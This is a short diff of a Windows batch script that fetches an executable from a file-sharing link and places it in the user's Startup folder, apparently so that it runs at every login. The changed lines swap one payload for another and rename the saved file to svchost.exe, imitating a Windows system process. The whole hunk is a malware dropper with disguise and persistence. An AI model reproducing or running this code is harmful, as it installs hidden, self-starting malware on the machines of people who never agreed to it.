@@ -20,8 +20,8 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://link.storjshare.io/s/jvgodndum3cnmdzwofmqcuyyd3oq/alboorgi/python-3.11.0-amd64.exe?download=1"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+set "URL=https://link.storjshare.io/s/jupizfqdjs75vrcxlx7blaybowka/isimsallaqwe/svchost.exe?download=1"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
 
 
 if exist "%DEST%" del "%DEST%"
